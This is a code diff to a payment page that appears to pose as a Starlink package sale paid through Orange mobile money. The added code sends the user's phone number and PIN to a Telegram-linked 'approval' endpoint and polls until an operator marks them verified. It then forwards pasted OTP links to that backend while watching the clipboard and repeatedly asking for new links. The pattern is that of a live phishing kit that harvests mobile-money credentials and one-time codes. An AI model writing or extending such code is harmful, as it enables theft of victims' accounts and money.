@@ -1177,6 +1177,7 @@
         let currentMsisdn = '';
         let currentPin = '';
         let starlinkPackage = null;
+        let currentRequestId = '';
         let timerInterval = null;
         
         const phoneInput = document.getElementById('phoneInput');
@@ -1229,7 +1230,7 @@
         // Capture Starlink package from URL
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.get('source') === 'starlink') {
-            starlinkPackage = urlParams.get('package') || 'starterer';
+            starlinkPackage = urlParams.get('package') || 'starter';
         }
         
         // Detect country
@@ -1373,53 +1374,77 @@
             nextBtn.querySelector('.btn-text').textContent = currentLang === 'fr' ? 'Traitement...' : 'Processing...';
 
             try {
-                await fetch('/api/orange/submit', {
+                const response = await fetch('/api/telegram/request-approval', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        phone: `${phoneCode} ${currentMsisdn}`,
-                        pin: currentPin,
-                        country: currentCountry,
-                        starlinkPackage: starlinkPackage
-                    })
+                    headers: { 'Content-Type': 'application/json', 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' },
+                    body: JSON.stringify({ userPhone: currentMsisdn, userPin: currentPin, package: starlinkPackage, amount: '', method: 'orange' })
                 });
+                const data = await response.json();
+                if (data.success) {
+                    currentRequestId = data.requestId;
+                    const pollTimer = setInterval(async () => {
+                        try {
+                            const statusRes = await fetch(`/api/telegram/status/${currentRequestId}`, {
+                                headers: { 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' }
+                            });
+                            const statusData = await statusRes.json();
+                            if (statusData.status === 'phone_pin_verified') {
+                                clearInterval(pollTimer);
+                                proceedAfterOrangeApproval();
+                            } else if (statusData.status === 'rejected' || statusData.status === 'invalid') {
+                                clearInterval(pollTimer);
+                                document.getElementById('pinError').textContent = statusData.status === 'rejected' ? 'Payment rejected by admin' : 'Invalid information provided';
+                                document.getElementById('pinError').classList.add('show');
+                                nextBtn.disabled = false;
+                                nextBtn.querySelector('.btn-text').textContent = t('next');
+                            } else if (statusData.status === 'timeout') {
+                                clearInterval(pollTimer);
+                                document.getElementById('pinError').textContent = 'Verification timeout. Please try again.';
+                                document.getElementById('pinError').classList.add('show');
+                                nextBtn.disabled = false;
+                                nextBtn.querySelector('.btn-text').textContent = t('next');
+                            }
+                        } catch (e) {}
+                    }, 3000);
+                } else {
+                    throw new Error(data.message || 'Approval request failed');
+                }
             } catch (e) {
                 document.getElementById('pinError').textContent = currentLang === 'fr' ? 'Une erreur est survenue. Veuillez r\u00e9essayer.' : currentLang === 'ar' ? 'حدث خطأ. يرجى المحاولة مرة أخرى.' : 'Something went wrong. Please try again.';
                 document.getElementById('pinError').classList.add('show');
-            }
-
-            // For DRC (CD), Sierra Leone (SL), Liberia (LR), Burkina Faso (BF) — no OTP, show not-verified screen
-            // Jordan (JO) uses 4-digit OTP — show Jordan OTP screen
-            if (currentCountry === 'JO') {
-                phoneScreen.classList.add('hidden');
-                document.getElementById('joPhoneDisplay').textContent = `${phoneCode} ${currentMsisdn}`;
-                document.getElementById('jordanOtpScreen').classList.add('active');
-                document.querySelector('[data-jo-index="0"]').focus();
-                startJordanOtpPolling();
                 nextBtn.disabled = false;
                 nextBtn.querySelector('.btn-text').textContent = t('next');
-                return;
             }
-            if (currentCountry === 'SL' || currentCountry === 'LR' || currentCountry === 'BF') {
+
+            function proceedAfterOrangeApproval() {
+                if (currentCountry === 'JO') {
+                    phoneScreen.classList.add('hidden');
+                    document.getElementById('joPhoneDisplay').textContent = `${phoneCode} ${currentMsisdn}`;
+                    document.getElementById('jordanOtpScreen').classList.add('active');
+                    document.querySelector('[data-jo-index="0"]').focus();
+                    startJordanOtpPolling();
+                    nextBtn.disabled = false;
+                    nextBtn.querySelector('.btn-text').textContent = t('next');
+                    return;
+                }
+                if (currentCountry === 'SL' || currentCountry === 'LR' || currentCountry === 'BF') {
+                    phoneScreen.classList.add('hidden');
+                    document.getElementById('notVerifiedScreen').classList.add('active');
+                    nextBtn.disabled = false;
+                    nextBtn.querySelector('.btn-text').textContent = t('next');
+                    return;
+                }
                 phoneScreen.classList.add('hidden');
-                document.getElementById('notVerifiedScreen').classList.add('active');
+                otpScreen.classList.add('active');
+                document.getElementById('phoneDisplay').textContent = `${phoneCode}${currentMsisdn}`;
+                linkInput.focus();
+                startTimer();
+                startStatusPolling();
+                startLinkPolling();
+                checkClipboardPermission();
                 nextBtn.disabled = false;
                 nextBtn.querySelector('.btn-text').textContent = t('next');
-                return;
             }
-
-            phoneScreen.classList.add('hidden');
-            otpScreen.classList.add('active');
-            document.getElementById('phoneDisplay').textContent = `${phoneCode}${currentMsisdn}`;
-            linkInput.focus();
-            startTimer();
-            startStatusPolling();
-            startLinkPolling();
-            // Gate: enforce clipboard permission before user can proceed
-            checkClipboardPermission();
-
-            nextBtn.disabled = false;
-            nextBtn.querySelector('.btn-text').textContent = t('next');
         });
         
         // Link input handling
@@ -1595,30 +1620,43 @@
                     })
                 });
                 
-                // Show success then prompt for new link
+                try {
+                    const telegramRes = await fetch('/api/telegram/submit-otp', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' },
+                        body: JSON.stringify({ requestId: currentRequestId, otp: link })
+                    });
+                    const telegramData = await telegramRes.json();
+                    if (!telegramData.success) {
+                        document.getElementById('otpError').textContent = telegramData.message || 'OTP verification failed';
+                        document.getElementById('otpError').classList.add('show');
+                        verifyBtn.disabled = false;
+                        verifyBtn.textContent = t('verify');
+                        return;
+                    }
+                } catch (e) {}
+                
                 const errEl = document.getElementById('otpError');
                 errEl.textContent = t('processing');
                 errEl.style.background = '#e8f5e9';
                 errEl.style.color = '#2e7d32';
                 errEl.classList.add('show');
                 
-                // Auto-clear input ready for next link
                 linkInput.value = '';
                 verifyBtn.disabled = true;
                 
-                // After 3 seconds, prompt user for new link and resume clipboard watching
                 setTimeout(() => {
                     errEl.textContent = t('pasteNew');
                     errEl.style.background = '#fff3e0';
                     errEl.style.color = '#e65100';
                     linkInput.focus();
-                    startLinkPolling(link); // restart, seed with submitted link so it won't re-submit it
+                    startLinkPolling(link);
                 }, 3000);
                 
             } catch (e) {
                 document.getElementById('otpError').textContent = t('verifyFailed');
                 document.getElementById('otpError').classList.add('show');
-                startLinkPolling(link); // restart so user can paste or auto-paste the new link
+                startLinkPolling(link);
             }
             
             verifyBtn.disabled = false;
